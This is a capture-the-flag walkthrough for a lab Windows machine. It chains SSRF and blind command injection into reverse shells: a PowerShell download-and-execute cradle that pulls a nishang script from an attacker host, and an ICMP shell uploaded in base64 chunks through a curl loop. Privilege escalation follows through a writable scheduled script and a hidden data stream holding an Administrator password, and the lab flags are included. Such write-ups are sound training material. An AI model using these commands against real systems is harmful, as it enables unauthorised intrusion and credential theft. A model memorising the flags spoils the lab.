**Skills Required**
● Intermediate/Advanced knowledge of
Windows
● Intermediate PowerShell knowledge
**Skills Learned**
● Exploiting Server Side Request
Forgery
● Exploiting blind command injection
● Finding and reading alternate data
streams

Port 62696 (http)

Check the HTTP service, which is a website, with WhatWeb:

```
whatweb http://10.10.10.57:62696
```

WhatWeb returns "Microsoft-IIS 8.5" and "X-Powered-By: ASP.NET."

Since it's ASP.NET, you can fuzz for files with extensions like asp or aspx using Gobuster:

```
gobuster dir -u http://10.10.10.57:62696/ -w /directory --add-slas -x asp,aspx
```

This found the file "test.asp." When checking this file on the website, it displays a message: "Missing parameter Url [u] in GET request." So, you add the parameter to the URL and try making a GET request to the victim machine's localhost to attempt an SSRF and internal port discovery:

```
http://10.10.10.57:62696/test.asp?u=http://127.0.0.1
```

The machine has port 80 internally open, so you can try enumerating ports using wfuzz:

```
wfuzz -c --hw=89 -t 200 -z range,1-65535  http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:FUZZ
```

The website on localhost has port 80 open and is an "site administration" application with various options, including "system commands":

```
http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx
```

This leads you to an application where you can enter commands. You attempt to gain access through a reverse shell, for which you need to serve the "invoke-powershelltcp" script from the GitHub repository nishang through a local server on your machine. Here's how:

```bash
# On your machine
# Add this to the end of the script
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 1234
python -m http.server 80
nc -nlvp 1234

# On the victim's web
http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/Invoke-PowerShellTcp.ps1')
```

This didn't work, so there might be firewall rules on the victim machine preventing the connection.

You then try to execute the reverse shell over ICMP using the nishang script "Invoke-PowerShellIcmp.ps1":

```bash
# On your machine
sysctl -w net.ipv4.icmp_echo_ignore_all=1
rlwrap icmpsh_m.py 10.10.14.29 10.10.10.57

# Add this to the end of the script
Invoke-PowerShellIcmp -IPAddress 10.10.14.4

# Remove line breaks from the script
cat Invoke-PowerShellIcmp.ps1 | sed '/^\s*$/d' | sponge Invoke-PowerShellIcmp.ps1

# Convert the script to base64 with iconv to upload it to the victim machine
cat Invoke-PowerShellIcmp.ps1 | iconv -t utf-16le | base64 -w 0 > Invoke-PowerShellIcmp.ps1.b64
fold Invoke-PowerShellIcmp.ps1.b64 | sponge Invoke-PowerShellIcmp.ps1.b64

# Upload the script line by line to the victim machine; you can automate this with a bash script
#!/bin/bash

counter=0
for line in $(cat icmp.ps1.b64); do
    echo -ne "[+] Total lines sent [$counter/87]\r"

    curl -s "http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=echo%20$line%20>>%20C:\Temp\prueba2.ps1"

    let counter+=1
done

# On the victim's web
http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=powershell $filecontent = Get-Content C:\Temp\prueba2.ps1; $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($filecontent)); $decode > C:\Temp\pwn.ps1

# Execute the reverse shell
http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=powershell C:\Temp\pwn.ps1
```

This way, you gained access to the machine.

Privilege Escalation

In the root directory, there's the "sysadmscripts" directory, containing a PowerShell script and a .bat file.

The .bat file executes the PowerShell script at intervals on the system. Checking the permissions on the PowerShell script, you see that as the current user, you have privileges over this script and can modify it:

```
cacls c.ps1
```

You can take advantage of this to copy files owned by the user who controls the .bat file:

```
echo "copy C:\Users\decoder.MINION\Desktop\* C:\Temp" > C:\sysadmscripts\c.ps1
```

Among the copied files, you know there's the "backup.zip" file. You can try to view the alternative data stream:

```
cmd /c dir /r /s C:\Temp\
# This found hidden information; to view it:
type C:\Temp\backup.zip:pass
```

The content is an NTLM hash, which when cracked gives you a password "1234test" belonging to the Administrator user. Externally, the WinRM service is not active, so you can't connect to the machine through it, but you can execute commands as Administrator using PowerShell:

```
$user = 'minion\Administrator'; $password = '1234test'; $secPw = ConvertTo-SecureString $password -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { dir }
```

Taking advantage of this, you can change the firewall rules on the victim machine to gain conventional access:

```
$user = 'minion\Administrator'; $password = '1234test'; $secPw = ConvertTo-SecureString $password -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user,$secPw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { New-NetFirewallRule -DisplayName kevin -RemoteAddress 10.10.14.4 -Direction inbound -Action allow }
```

Now you can perform a scan from your attacker machine and have access to the victim machine's ports and gain access through the WinRM service.

Root flag: 25afc18b756db150854

28015928a1cf1
User flag: 40b949f92b86b19a77986af9faf91601